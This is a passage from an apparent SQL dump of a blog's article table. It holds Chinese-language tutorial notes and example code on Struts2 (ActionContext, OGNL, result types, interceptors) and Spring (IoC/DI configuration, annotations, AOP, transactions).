主要用于向客户端发送数据\n5. page: 处理JSP网页，是Object类的一个实例，指的是JSP实现类的实例，即它也是JSP本身，只有在JSP页面范围之内才是合法的。\n6. pageContext: 管理网页属性,为JSP页面包装页面的上下文，管理对属于JSP中特殊可见部分中已命名对象的访问，它的创建和初始化都是由容器来完成的\n7. out: 主要用于向客户端输出数据; Out的基类是JspWriter\n8. config: 代码片段配置对象，表示Servlet的配置\n9. exception: 处理JSP文件执行时发生的错误和异常\n\n// ActionContext可以获得原生web中几乎所有的对象,它是struts2获得web对象的核心方法\n// 获得原生web对象\n    @Override\n    public String execute() throws Exception {\n        ServletActionContext.getRequest();\n        ServletActionContext.getResponse();\n        ServletActionContext.getRequest().getSession();\n        ServletActionContext.getServletContext();\n        ServletActionContext.getServletContext();\n        return \"success\";\n    }\n    // 获得struts2包装后的web对象\n    @Override\n    public String execute() throws Exception {\n        // 原生request域 -> map\n        Map<String, Object> requestScope = (Map<String, Object>) ActionContext.getContext().get(\"request\");\n        // request与ActionContext生命周期一样,ActionContext本身就是包装后的request\n        ActionContext.getContext().put(\"name\", \"requestValue\");\n        // session域 -> map\n        ActionContext.getContext().getSession().put(\"name\", \"sessionValue\");\n        // application域  -> map\n        ActionContext.getContext().getApplication().put(\"name\", \"applicationValue\");\n        // valueStack\n        ActionContext.getContext().getValueStack();\n        return \"success\"; \n    }\n\n\n```\n\n### OGNL\n```java\n// OGNL是一种表达式语言,像模板解析引擎一样,不过功能挺强大\n// OGNL包含root和context两个存放值的地方\n// struts2的valueStack值栈实际就是ognl对象,包含root和context\n// 所以valueStack即是struts2的ognl对象,JSP中使用ognl表达式即可取值(El表达式也可以)\n\n    // root取值\n    @Test\n    public void fun2() throws Exception {\n        OgnlContext oc = new OgnlContext();\n        User rootUser = new User(\"t\", 18);\n        oc.setRoot(rootUser);\n        \n        // 取出root中user对象的name,没有#字符\n        String name = (String) Ognl.getValue(\"name\", oc, oc.getRoot());\n        Integer age = (Integer) Ognl.getValue(\"age\", oc, oc.getRoot());\n        System.out.println(name +\",\"+age);\n    }\n    // context取值\n    @Test\n    public void fun3() throws Exception {\n        OgnlContext oc = new OgnlContext();\n        \n        Map<String, User> context = new HashMap<String, User>();\n        context.put(\"user1\", new User(\"j\", 18));\n        context.put(\"user2\", new User(\"r\", 22));\n        oc.setValues(context);\n        \n        // 取出root中user对象的name\n        String name = (String) Ognl.getValue(\"#user1.name\", oc, oc.getRoot());\n        String name2 = (String) Ognl.getValue(\"#user2.name\", oc, oc.getRoot());\n        Integer age = (Integer) Ognl.getValue(\"#user2.age\", oc, oc.getRoot());\n        System.out.println(name);\n        System.out.println(name2);\n        System.out.println(age);\n    }\n    // 赋值并取值\n    @Test\n    public void fun4() throws Exception {\n        OgnlContext oc = new OgnlContext();\n        User rootUser = new User(\"t\", 18);\n        oc.setRoot(rootUser);\n        \n        Map<String, User> context = new HashMap<String, User>();\n        context.put(\"user1\", new User(\"j\", 18));\n        context.put(\"user2\", new User(\"r\", 22));\n        oc.setValues(context);\n        \n        Ognl.getValue(\"name=\'jerry\'\", oc, oc.getRoot());\n        String name = (String) Ognl.getValue(\"name\", oc, oc.getRoot());\n        System.out.println(name);\n        \n        String name2 = (String) Ognl.getValue(\"#user1.name=\'s\',#user1.name\", oc, oc.getRoot());\n        System.out.println(name2);\n    }\n    // 实例方法\n    @Test\n    public void fun5() throws Exception {\n        OgnlContext oc = new OgnlContext();\n        User rootUser = new User(\"t\", 18);\n        oc.setRoot(rootUser);\n        \n        Map<String, User> context = new HashMap<String, User>();\n        context.put(\"user1\", new User(\"j\", 18));\n        context.put(\"user2\", new User(\"r\", 22));\n        oc.setValues(context);\n        \n        Ognl.getValue(\"setName(\'lilei\')\", oc, oc.getRoot());;\n        String name = (String) Ognl.getValue(\"getName()\", oc, oc.getRoot());\n        System.out.println(name);\n        \n        String name2 = (String) Ognl.getValue(\"#user1.setName(\'lucy\'),#user1.getName()\", oc, oc.getRoot());\n        System.out.println(name2);\n    }\n    // 调用静态方法\n    @Test\n    public void fun6() throws Exception {\n        OgnlContext oc = new OgnlContext();\n        User rootUser = new User(\"t\", 18);\n        oc.setRoot(rootUser);\n        \n        Map<String, User> context = new HashMap<String, User>();\n        context.put(\"user1\", new User(\"j\", 18));\n        context.put(\"user2\", new User(\"r\", 22));\n        oc.setValues(context);\n        \n        String name = (String) Ognl.getValue(\"@root.model.WtUtils@echo(\'hh\')\", oc, oc.getRoot());\n        Double pi = (Double) Ognl.getValue(\"@java.lang.Math@PI\", oc, oc.getRoot());\n        System.out.println(name);\n        System.out.println(pi);\n    }\n    // 创建list|map\n    @Test\n    public void fun7() throws Exception {\n        OgnlContext oc = new OgnlContext();\n        User rootUser = new User(\"t\", 18);\n        oc.setRoot(rootUser);\n        \n        Map<String, User> context = new HashMap<String, User>();\n        context.put(\"user1\", new User(\"j\", 18));\n        context.put(\"user2\", new User(\"r\", 22));\n        oc.setValues(context);\n        \n        Integer size = (Integer) Ognl.getValue(\"{\'tom\', \'jerry\', \'jack\', \'rose\'}.size()\", oc, oc.getRoot());\n        String name = (String) Ognl.getValue(\"{\'tom\', \'jerry\', \'jack\', \'rose\'}[0]\", oc, oc.getRoot());\n        String name2 = (String) Ognl.getValue(\"{\'tom\', \'jerry\', \'jack\', \'rose\'}.get(1)\", oc, oc.getRoot());\n        System.out.println(size);\n        System.out.println(name);\n        System.out.println(name2);\n        \n        Integer size2 = (Integer) Ognl.getValue(\"#{\'name\':\'tom\',\'age\':\'18\'}.size()\", oc, oc.getRoot());\n        String name3 = (String) Ognl.getValue(\"#{\'name\':\'tom\',\'age\':\'18\'}[\'name\']\", oc, oc.getRoot());\n        System.out.println(name3);\n        \n    }\n```\n### 请求与响应\n#### 请求\n![Struts2ValueStack值栈.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626673405_Struts2-ValueStack值栈.png)\n```java\n// struts2主要是利用valueStack来进行数据的封装\n// struts2会将请求数据压入栈中并封装在action的数据对象中\n// 原生request域 => 查找valueStack的Root部分 => 查找valueStack的Context部分\n1. ognl与struts2结合关键就在valueStack(相当于OgnlContext)\n2. 在取栈中的属性时,会从栈顶开始找属性,找不到会继续向下找,找到就停止\n3. 默认情况下,栈中放置当前访问的Action对象\n4. request.getAttribute查找顺序\n\n\npublic class Param3Action extends ActionSupport implements ModelDriven<User>{\n    // 准备user对象\n    private User user = new User();\n    \n    @Override\n    public String execute() throws Exception {\n        System.out.println(user);\n        return \"success\";\n    }\n    @Override\n    public User getModel() {\n        return user;\n    }\n} \n\n// 页面\n<form action=\"${pageContext.request.contextPath}/Param3Action\">\n    用户名:<input type=\"text\" name=\"name\" /><br>\n    年龄:<input type=\"text\" name=\"age\" /><br>\n    生日:<input type=\"text\" name=\"birthday\" /><br>\n    <input type=\"submit\" value=\"提交\" />\n</form> \n\n// struts.xml\n<action name=\"Param3Action\" class=\"root.param.Param3Action\" method=\"execute\" >\n    <result name=\"success\" type=\"dispatcher\">/form3.jsp</result>\n</action> \n\n```\n#### 响应\n![TIM截图20181102190018.png](http://blog.img.tuwq.cn/upload/artimg/2018/11/1541156428_TIM截图20181102190018.png)\n```java\n// struts2根据结果字符串判定返回结果,其中有*返回类型*,所有返回类型如下\n// 常用的返回类型有四种\n<package name=\"result\" namespace=\"/\" extends=\"struts-default\" >\n    <!-- 转发 -->\n    <action name=\"ResultAction\" class=\"root.result.ResultAction\" method=\"execute\" >\n        <result name=\"success\" type=\"dispatcher\">hello.jsp</result>\n    </action>\n    <!-- 重定向 -->\n    <action name=\"Result2Action\" class=\"root.result.Result2Action\" method=\"execute\" >\n        <result name=\"success\" type=\"redirect\">hello.jsp</result>\n    </action>\n    <!-- 转发到Action -->\n    <action name=\"Result3Action\" class=\"root.result.Result3Action\" method=\"execute\" >\n        <result name=\"success\" type=\"chain\">\n            <param name=\"actionName\">ResultAction</param>\n            <param name=\"namespace\">/</param>\n        </result>\n    </action>\n    <!-- 重定向到Action -->\n    <action name=\"Result4Action\" class=\"root.result.Result4Action\" method=\"execute\" >\n        <result name=\"success\" type=\"redirectAction\">\n            <param name=\"actionName\">ResultAction</param>\n            <param name=\"namespace\">/</param>\n        </result>\n    </action>\n</package>\n```\n#### 转发与重定向区别\n```java\n// 重定向与转发的区别\n// 转发\n转发,转发是在服务器端转发的，客户端是不知道的\nrequest.getRequestDispatcher(\"/aj.jsp\").forward(request, response);\n\n请求转发是服务器内部把对一个request/response的处理权，移交给另外一个请求.对于客户端而言，它只知道自己最早请求的那个A，而不知道中间的B，甚至C、D。 *传输的信息不会丢失*\n\n客户首先发送一个请求到服务器端，服务器端发现匹配的servlet，并指定它去执行，当这个servlet执行完之后，它要调用getRequestDispacther()方法，把请求转发给指定的aj.jsp\n整个流程都是在服务器端完成的，而且是在同一个请求里面完成的，\n因此servlet和jsp共享的是同一个request，在servlet里面放的所有东西，在aj中都能取出来，\n因此，aj能把结果getAttribute()出来，getAttribute()出来后执行完把结果返回给客户端。*整个过程是一个请求，一个响应* \n\n// 重定向\n重定向，*不会共享request*\nresponse.sendRedirect(request.getContextPath() + \"/bj.jsp\");\n\n客户发送一个请求到服务器，服务器匹配servlet，这都和请求转发一样，servlet处理完之后调用了sendRedirect()这个方法，这个方法是response的方法\n所以，当这个servlet处理完之后，看到response.senRedirect()方法，立即向客户端返回这个响应，响应行告诉客户端你必须要再发送一个请求，去访问bj.jsp，紧接着客户端受到这个请求后，立刻发出一个新的请求，去请求bj.jsp,这里两个请求互不干扰，相互独立，在前面request里面setAttribute()的任何东西，在后面的request里面都获得不了。可见，\n在sendRedirect()里面是*两个请求，两个响应*\n\n// 总结重定向与转发\n1. 转发在服务器端完成的；重定向是在客户端完成的\n2. 转发的速度快；重定向速度慢\n3. 转发的是同一次请求；重定向是两次不同请求\n4. 转发不会执行转发后的代码；重定向会执行重定向之后的代码\n5. 转发地址栏没有变化；重定向地址栏有变化\n6. 转发必须是在同一台服务器下完成；重定向可以在不同的服务器下完成\n7. Forward是在服务器端的跳转，就是客户端一个请求发给服务器，服务器直接将请求相关的参数的信息原封不动的传递到该服务器的其他jsp或servlet去处理，而sendredirect是在客户端的跳转，服务器会返回给客户端一个响应报头和新的URL地址，原来的参数什么的信息如果服务器端没有特别处理就不存在了，浏览器会访问新的URL所指向的servlet或jsp，这可能不是原先服务器上的webservce了\n```\n### 重要属性配置\n#### web.xml核心过滤器配置\n```xml\n<filter>\n    <filter-name>struts2</filter-name>\n    <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>\n</filter>\n<filter-mapping>\n    <filter-name>struts2</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n```\n#### struts.xml映射配置\n```xml\n<!-- package:将Action配置封装.就是可以在Package中配置很多action.\n    name属性: 给包起个名字,起到标识作用.随便起.不能其他包名重复.(区分业务模块,相当于SpringMvc类上的controller)\n    namespace属性:给action的访问路径中定义一个命名空间(区分业务模块,相当于SpringMvc类上的RequestMapping)\n    extends属性: 继承一个 指定包,默认(struts-default.xml)\n    abstract属性:包是否为抽象的; 标识性属性.标识该包不能独立运行.专门被继承\n-->\n    <package name=\"hello\" namespace=\"/hello\" extends=\"struts-default\" >\n        <!-- action元素:配置action类\n                name属性: 决定了Action访问资源名.(区分方法,相当于SpringMvc方法上的RequestMapping)\n                class属性: action的完整类名\n                method属性: 指定调用Action中的哪个方法来处理请求\n         --> \n        <action name=\"hellotest\" class=\"root.action.HelloAction\" method=\"hello\" >\n        <!-- result元素:结果配置 \n                            name属性: 标识结果处理的名称.与action方法的返回值对应.\n                            type属性: 指定调用哪一个result类来处理结果,默认使用转发.\n                            标签体:填写页面的相对路径\n        -->\n                <result name=\"success\" type=\"dispatcher\" >/hello.jsp</result>\n        </action> \n    </package>  \n```\n#### 引入其他struts文件,便于模块化 \n```xml\n<include file=\"root/dynamic/struts.xml\"></include>\n```\n#### 动态方法占位符配置\n```xml\n<action name=\"Demo1Action_*\" class=\"root.dynamic.Demo1Action\" method=\"{1}\" >\n    <result name=\"success\" >/hello.jsp</result>\n</action> \n```\n#### 常用常量配置\n```xml\n<!-- i18n:国际化. 解决post提交乱码 -->\n<constant name=\"struts.i18n.encoding\" value=\"UTF-8\"></constant>\n<!-- 指定反问action时的后缀名 -->\n<constant name=\"struts.action.extension\" value=\"action,,do\"></constant>\n<!-- 指定struts2是否以开发模式运行(热部署)\n    1.热加载主配置.(不需要重启即可生效)\n    2.提供更多错误信息输出,方便开发时的调试\n--> \n<constant name=\"struts.devMode\" value=\"true\"></constant>\n<!-- 配置动态方法调用是否开启常量\n    默认是关闭的,需要开启\n-->\n<constant name=\"struts.enable.DynamicMethodInvocation\" value=\"false\"></constant>\n```\n#### 全局异常处理\n```xml\n<global-exception-mappings>\n    <!-- 如果出现java.lang.RuntimeException异常,就将跳转到名为error的结果 -->\n    <exception-mapping result=\"error\" exception=\"java.lang.RuntimeException\"></exception-mapping>\n</global-exception-mappings>\n```\n#### 全局结果处理\n```xml\n<global-results>\n    <result name=\"toLogin\" type=\"redirect\">/login.jsp</result>      \n</global-results>\n```\n#### 定义拦截器\n```java\npublic class LoginInterceptor extends MethodFilterInterceptor {\n    @Override\n    protected String doIntercept(ActionInvocation invocation) throws Exception {\n        Map<String, Object> session = ActionContext.getContext().getSession();\n        Object object = session.get(\"user\");\n        if (object == null) {\n            return \"toLogin\";\n        } else {\n            return invocation.invoke();\n        }\n    }\n}\n``` \n#### 注册拦截器\n```xml\n<interceptors>\n            <interceptor name=\"loginInterceptor\" class=\"root.web.interceptor.LoginInterceptor\"></interceptor>\n    <interceptor-stack name=\"myStack\">\n    <!-- 自定义拦截器引入 -->\n    <interceptor-ref name=\"loginInterceptor\">\n        <!-- 指定哪些方法不拦截 -->\n        <param name=\"excludeMethods\">login</param>\n        <!-- 指定哪些方法需要拦截 -->\n        <param name=\"includeMethods\">add,delete</param>\n    </interceptor-ref>\n    <!-- 引用默认35个拦截器 -->\n    <interceptor-ref name=\"defaultStack\"></interceptor-ref>\n    </interceptor-stack>\n</interceptors>\n<!-- 默认包中拦截器栈 -->\n<default-interceptor-ref name=\"myStack\"></default-interceptor-ref> \n```', 0, 0, 77, 0, 0, '2018-11-08 15:17:14', '2018-11-08 15:17:14', 0, 0);
INSERT INTO `article` VALUES (14, 1, 'spring示例代码', '2018/11/1541316304_ae7a7e662981336dc06eeb40f89b5a5d.jpg', '### 控制反转与依赖注入\n```java\n// IOC\n1. InverseOfControl*反转控制*\n2. 将我们创建对象的方式反转了\n3. 使用了spring之后,对象的创建以及依赖关系可以由spring完成创建以及注入\n4. 反射创建对象*,便于管理控制\n\n// DI\n1. DependencyInjection 依赖注入\n2. 实现IOC思想需要DI作支持\n3. 注入方式:set方法,构造方法,字段注入\n4. 注入类型:值类型注入(8大基本数据类型),引用类型注入(将依赖对象注入)\n5. 就是将属性数据*注入目标中*,运用set,构造或者反射字段\n\n// 创建对象的方式\n<!-- 创建方式1:空参构造创建  -->\n<bean  name=\"user\" class=\"root.model.User\" init-method=\"init\" destroy-method=\"destory\" scope=\"singleton\"></bean>\n<!-- 创建方式2:静态工厂创建 \n	调用UserFactory的createUser方法创建名为user2的对象.放入容器\n -->\n<bean  name=\"user2\" class=\"root.create.UserFactory\" factory-method=\"createUser\" ></bean>\n<!-- 创建方式3:实例工厂创建 \n	调用UserFactory对象的createUser2方法创建名为user3的对象.放入容器-->\n<bean  name=\"user3\" factory-bean=\"userFactory\" factory-method=\"createUser2\" ></bean>\n<bean  name=\"userFactory\" class=\"root.create.UserFactory\"></bean>\n\n// 注册创建对象的属性\n// xml方式\n<!-- 将User对象交给spring容器管理 -->\n<!-- Bean元素:使用该元素描述需要spring容器管理的对象 \n	class属性:被管理对象的完整类名. \n	name属性:给被管理的对象起个名字.获得对象时根据该名称获得对象. 可以重复.可以使用特殊字符. \n	id属性: 与name属性一模一样. 名称不可重复.被作为唯一引用,不能使用特殊字符. 结论: 尽量使用name属性. \n	init-method属性: 配置一个方法作为生命周期初始化方法,spring会在对象创建之后调用\n	destroy-method属性: 配置一个方法作为生命周期销毁方法,spring容器在关闭并销毁所有容器中的对象之前调用\n	scope属性: \n		singleton(默认值): 单例对象,被标识为单例的对象在spring容器中只会存在一个实例 \n		prototype: 多例原型,被标识为多例的对象,*每次再获得时才会创建*,每次创建都是新的对象(整合struts2的Action等相似对象时使用)\n		request: web环境下,对象与request生命周期一致(无用处)\n		session: web环境下,对象与session生命周期一致(无用处)\n	-->\n<bean id=\"user\" name=\"user\" class=\"root.model.User\" \ninit-method=\"init\" destroy-method=\"destory\" scope=\"singleton\"></bean>\n<!-- 导入其他spring配置文件,分模块化时 -->\n<import resource=\"root/create/applicationContext.xml\" />\n\n// 属性注入\n<!-- set方式注入: -->\n	<bean  name=\"user\" class=\"root.model.User\" >\n		<!--值类型注入: 为User对象中名为name的属性注入tom作为值 -->\n		<property name=\"name\" value=\"tom\" ></property>\n		<property name=\"age\"  value=\"18\" ></property>\n		<!-- 引用类型注入: 为car属性注入下方配置的car对象 -->\n		<property name=\"car\"  ref=\"car\" ></property>\n	</bean>\n	<!-- 将car对象配置到容器中 -->\n	<bean name=\"car\" class=\"root.model.Car\" >\n		<property name=\"name\" value=\"兰博基尼\" ></property>\n		<property name=\"color\" value=\"黄色\" ></property>\n	</bean>\n\n<!-- 构造函数注入 -->\n	<bean name=\"user2\" class=\"root.model.User\" >\n		<!-- name属性: 构造函数的参数名 -->\n		<!-- index属性: 构造函数的参数索引 -->\n		<!-- type属性: 构造函数的参数类型-->\n		<constructor-arg name=\"name\" index=\"0\" type=\"java.lang.Integer\" value=\"999\"  ></constructor-arg>\n		<constructor-arg name=\"car\" ref=\"car\" index=\"1\" ></constructor-arg>\n	</bean> \n\n<!-- p名称空间注入, 走set方法\n		1.导入P名称空间  xmlns:p=\"http://www.springframework.org/schema/p\"\n		2.使用p:属性完成注入\n			|-值类型: p:属性名=\"值\"\n			|-对象类型: p:属性名-ref=\"bean名称\"\n	 -->\n	<bean  name=\"user3\" class=\"root.model.User\" p:name=\"jack\" p:age=\"20\" p:car-ref=\"car\"  >\n	</bean> \n\n<!--  \n	spel注入: spring Expression Language sping表达式语言 -->\n	<bean  name=\"user4\" class=\"root.model.User\" >\n		<property name=\"name\" value=\"#{user.name}\" ></property>\n		<property name=\"age\" value=\"#{user3.age}\" ></property>\n		<property name=\"car\" ref=\"car\" ></property>\n	</bean> \n\n<!-- 复杂类型注入 -->\n	<bean name=\"cb\" class=\"root.injection.CollectionBean\" >\n		<!-- 如果数组中只准备注入一个值(对象),直接使用value|ref即可 \n		<property name=\"arr\" value=\"tom\" ></property>\n		-->\n		<!-- array注入,多个元素注入 -->\n		<property name=\"arr\">\n			<array>\n				<value>tom</value>\n				<value>jerry</value>\n				<ref bean=\"user4\" />\n			</array>\n		</property>\n		\n		<!-- 如果List中只准备注入一个值(对象),直接使用value|ref即可 \n		<property name=\"list\" value=\"jack\" ></property>-->\n		<property name=\"list\"  >\n			<list>\n				<value>jack</value>\n				<value>rose</value>\n				<ref bean=\"user3\" />\n			</list>\n		</property>\n		<!-- map类型注入 -->\n		<property name=\"map\"  >\n			<map>\n				<entry key=\"url\" value=\"jdbc:mysql:///crm\" ></entry>\n				<entry key=\"user\" value-ref=\"user4\"  ></entry>\n				<entry key-ref=\"user3\" value-ref=\"user2\"  ></entry>\n			</map> \n		</property>\n		<!-- prperties 类型注入 -->\n		<property name=\"prop\"  >\n			<props>\n				<prop key=\"driverClass\">com.jdbc.mysql.Driver</prop>\n				<prop key=\"userName\">root</prop>\n				<prop key=\"password\">1234</prop>\n			</props>\n		</property>\n	</bean>\n```\n### BeanFactory与ApplicationContext\n```java\n// BeanFactory\n1. BeanFactory: spring顶级原始接口,针对原始接口的实现类功能较为单一\n2. BeanFactory接口实现类的容器,特点是*每次在获得对象时才会创建对象*(硬件资源匮乏时代)\n\n// ApplicationContext\n1. 每次容器*启动时就会创建容器中配置的所有对象*\n2. 从类路径下加载配置文件:ClassPathXmlApplicationContext\n3. 硬盘绝对路径下加载配置文件:FileSystemXmlApplicationContext\n4. web开发中,使用applicationContext,在资源匮乏的环境(开发板)可以使用BeanFactory \n\n// 开启spring容器\nClassPathXmlApplicationContext ac = new ClassPathXmlApplicationContext(\"applicationContext.xml\");\n// 获取容器中的对象\nUser u = (User) ac.getBean(\"user\");\n// 关闭容器\nac.close()\n\n// 配置容器生命周期\n// 显然,每次从ClassPathXmlApplicationContext中获取造成*对象资源问题*,我们希望整个项目中只有一个ApplicationContext用来获取Bean对象,而不是每次创建一个ApplicationContext,我们希望*spring随项目启动而创建,随项目销毁而销毁*,且只有一个   \n// javaWeb三大核心组件中的*listener*可以很好的满足这个需求,spring考虑到这点提供一个实现需求的listener\n\n<!-- 让spring随web启动而创建的监听器 -->\n  <listener>\n  	<listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n  </listener>\n  <!-- 配置spring配置文件位置参数 -->\n  <context-param>\n  	<param-name>contextConfigLocation</param-name>\n  	<param-value>classpath:applicationContext.xml</param-value>\n  </context-param> \n```\n### Spring注解\n```java\n// 开启注解\n<!-- 指定扫描root包下的所有类中的注解. 注意:扫描包时.会扫描指定报下的所有子孙包 -->\n<context:component-scan base-package=\"root\"></context:component-scan>\n\n// 常用注解\n@Component: 注册对象\n@Controller: 注册并表明这是接口层对象\n@Service: 注册并表明这是业务层对象\n@Repository: 注册并表明这是持久层对象\n@Mapper: 注册Mybatis的代理接口\n@RestController: Controller+RequestMapping\n@RequestMapping: 支持所有方法的请求映射\n@GetMapping: 仅支持Get请求映射\n@Configuration: 注册为一个配置类对象\n@Bean: 注册该方法的返回值对象,方法名为对象的name\n@Async: 注册为异步方法\n@ControllerAdvice: 注册为增强类\n@ExceptionHandler: 异常映射处理\n@Autowired: 自动注入\n@Qualifier：指定注入对象具体name\n@Resource: 自动注入,并可指定注入对象具体name\n@Scheduled： 注册cron定时任务方法\n@Value: 获取配置值\n@EnableConfigurationProperties: 开启配置类\n@ConfigurationProperties: 注册为配置类\n@SpringBootApplication: springboot的启动类\n@EnableAsync: 开启异步方法\n@EnableScheduling: 开启cron定时任务\n@Scope: 对象是否为单例或多例(singleton,prototype)\n@ComponentScan: spring包扫描位置\n@MapperScan: Mybatis代理接口包位置\n@ImportResource: 加载xml文件\n@Import: 加载配置类\n@PostConstruct: 对象的init-method方法\n@PreDestory: 对象的destroy-method方法\n@Aspect: 注册为切面类\n@Around: 环绕通知方法\n@Pointcut: 统一切面类的execution表达式\n@RunWith(SpringJUnit4ClassRunner.class): 通过with指定类,调用指定方法创建测试环境,创建spring容器\n@ContextConfiguration(\"classpath:applicationContext.xml\"): 指定创建容器时使用哪个配置文件\n```\n### AOP\n```java\n// aop思想\n1. 横向重复,纵向抽取\n2. jdk代理依靠聚合需要接口,cglib代理依靠继承\n\n// spring的aop名词 \n1. Joinpoint(连接点): 目标对象中,所有*可以*增强方法(add,delete...)\n2. Pointcut(切入点): 目标对象,*已经(需要)*增强的方法(addPro,deletePro...)\n3. Advice(通知): 增强的代码(*内容*)\n4. Target(目标对象): *被代理*对象\n5. Weaving(织入): 将通知应用到连接点形成切入点的*这个过程*叫做织入\n6. Proxy(代理): 将通知织入到目标对象之后,*形成*的代理对象\n7. aspect(切面): *切入点+通知* \n\n// 通知类型\n前置通知 -> 目标方法运行前调用\n后置通知(如果出现异常将不会调用) -> 目标方法运行后调用\n环绕通知	-> 在目标方法运行前和后都调用\n异常拦截通知	-> 如果出现异常就会调用\n后置通知(无论是否异常都会调用) -> 目标方法运行后调用\n```\n#### 配置文件Aop切面\n```java\n// 被增强类\n// 对四个方法进行切面增强\npublic class UserServiceImpl implements UserService{\n\n	@Override\n	public void save() {\n		System.out.println(\"save\");\n	}\n\n	@Override\n	public void delete() {\n		System.out.println(\"delete\");\n	}\n\n	@Override\n	public void update() {\n		System.out.println(\"update\");\n	}\n\n	@Override\n	public void find() {\n		System.out.println(\"find\");\n	}\n\n}\n\n// 切面类\npublic class SpringAdvice {\n\n	// 前置通知 -> 目标方法运行前调用\n	// 后置通知(如果出现异常将不会调用) -> 目标方法运行后调用\n	// 环绕通知	-> 在目标方法运行前和后都调用\n	// 异常拦截通知	-> 如果出现异常就会调用\n	// 后置通知(无论是否异常都会调用) -> 目标方法运行后调用\n\n	// 前置通知\n	public void before() {\n		System.out.println(\"这是前置通知\");\n	}\n	\n	// 后置通知(如果出现异常不会调用)\n	public void afterReturning() {\n		System.out.println(\"这是后置通知!(如果出现异常不会调用)\");\n	}\n	\n	// 环绕通知\n	public Object around(ProceedingJoinPoint pjp) throws Throwable {\n		System.out.println(\"环绕通知!之前!\");\n		// 调用目标方法\n		Object proceed = pjp.proceed();\n		System.out.println(\"环绕通知!之后!\");\n		return proceed;\n	}\n	\n	public void afterException() {\n		System.out.println(\"出现异常了\");\n	}\n\n	public void after() {\n		System.out.println(\"这是后置通知!(无论是否异常都会调用)\");\n	}\n} \n\n// 配置文件\n	<!-- 配置目标对象 -->\n	<bean name=\"userService\" class=\"root.service.impl.UserServiceImpl\"></bean>\n	<!-- 配置通知对象 -->\n	<bean name=\"springAdvice\" class=\"root.spring.springaop.SpringAdvice\"></bean>\n	<!-- 配置将通知织入目标对象 -->\n	<aop:config>\n		<!-- 配置切入点,目标对象,*需要*增强的方法(addPro,deletePro...) \n			public void root.service.UserServiceImpl.save() \n			void root.service.UserServiceImpl.save()\n			* root.service.UserServiceImpl.save()\n			* root.service.UserServiceImpl.*()\n			\n			* root.service.*ServiceImpl.*(..)\n			* root.service..*ServiceImpl.*(..)\n		-->\n		<!--配置切入点  -->\n		<aop:pointcut expression=\"execution(* root.service.impl.*ServiceImpl.*(..))\" id=\"pc\"/>\n		<aop:aspect ref=\"springAdvice\">\n			<!-- 指定名为before方法作为前置通知 -->\n			<aop:before method=\"before\" pointcut-ref=\"pc\" />\n			<!-- 后置 -->\n			<aop:after-returning method=\"afterReturning\" pointcut-ref=\"pc\" />\n			<!-- 环绕通知 -->\n			<aop:around method=\"around\" pointcut-ref=\"pc\" />\n			<!-- 异常拦截通知 -->\n			<aop:after-throwing method=\"afterException\" pointcut-ref=\"pc\"/>\n			<!-- 后置 -->\n			<aop:after method=\"after\" pointcut-ref=\"pc\"/>\n		</aop:aspect>\n	</aop:config>\n```\n#### 注解Aop切面\n```java\n// 开启注解切面\n<!-- 开启使用注解完成织入 -->\n<aop:aspectj-autoproxy></aop:aspectj-autoproxy>\n\n// 切面类\n@Aspect\npublic class SpringAdvice {\n\n	// 前置通知 -> 目标方法运行前调用\n	// 后置通知(如果出现异常将不会调用) -> 目标方法运行后调用\n	// 环绕通知	-> 在目标方法运行前和后都调用\n	// 异常拦截通知	-> 如果出现异常就会调用\n	// 后置通知(无论是否异常都会调用) -> 目标方法运行后调用\n	@Pointcut(\"execution(* root.service.impl.*ServiceImpl.*(..))\")\n	public void pc() {}\n	\n	// 前置通知\n	@Before(\"SpringAdvice.pc()\")\n	public void before() {\n		System.out.println(\"这是前置通知\");\n	}\n	\n	// 后置通知(如果出现异常不会调用)\n	@AfterReturning(\"execution(* root.service.impl.*ServiceImpl.*(..))\")\n	public void afterReturning() {\n		System.out.println(\"这是后置通知!(如果出现异常不会调用)\");\n	}\n	\n	// 环绕通知\n	@Around(\"execution(* root.service.impl.*ServiceImpl.*(..))\")\n	public Object around(ProceedingJoinPoint pjp) throws Throwable {\n		System.out.println(\"环绕通知!之前!\");\n		// 调用目标方法\n		Object proceed = pjp.proceed();\n		System.out.println(\"环绕通知!之后!\");\n		return proceed;\n	}\n	\n	@AfterThrowing(\"execution(* root.service.impl.*ServiceImpl.*(..))\")\n	public void afterException() {\n		System.out.println(\"出现异常了\");\n	}\n\n	@After(\"execution(* root.service.impl.*ServiceImpl.*(..))\")\n	public void after() {\n		System.out.println(\"这是后置通知!(无论是否异常都会调用)\");\n	}\n}\n```\n### 事务 \n```java\n// Spring事务实现靠Aop思想实现\n// spring主要配置三个属性\n1. 事务隔离级别\n2. 是否只读\n3. 事务传播行为(service平行调用),决定业务方法之间调用,事务应该如何处理\n\n// 事务传播行为可选项\nProPagation_required: 支持当前事务,如果不存在,就新建一个(默认)\nProPagation_supports: 支持当前事务,如果不存在,就不使用使用\nProPagation_mandatory: 支持当前事务,如果不存在,抛出异常\nProPagation_requires_new: 如果有事务存在,挂起当前事务,创建一个新的事务\nProPagation_not_supported: 以非事务方式运行,如果有事务存在,挂起当前事务\nProPagation_never: 以非事务方式运行,如果有事务运行,抛出异常\nProPagation_nested: 如果当前事务存在,则嵌套事务执行\n```\n\n#### 配置文件事务\n```java\n<!-- 事务核心管理器,封装了所有事务操作. 依赖于连接池 -->\n	<bean name=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\">\n		<property name=\"dataSource\" ref=\"dataSource\"></property>\n	</bean>\n	<!-- 事务模板对象 -->\n	<bean name=\"transactionTemplate\" class=\"org.springframework.transaction.support.TransactionTemplate\">\n		<property name=\"transactionManager\" ref=\"transactionManager\"></property>\n	</bean>\n\n	<!-- 配置事务通知 -->\n	<tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\">\n		<tx:attributes>\n			<!-- 以方法为单位,指定方法应用什么事务属性 isolation:隔离级别 propagation:传播行为 read-only:是否只读 -->\n			<tx:method name=\"save*\" isolation=\"REPEATABLE_READ\"\n				propagation=\"REQUIRED\" read-only=\"false\" />\n			<tx:method name=\"persist*\" isolation=\"REPEATABLE_READ\"\n				propagation=\"REQUIRED\" read-only=\"false\" />\n			<tx:method name=\"update*\" isolation=\"REPEATABLE_READ\"\n				propagation=\"REQUIRED\" read-only=\"false\" />\n			<tx:method name=\"modify*\" 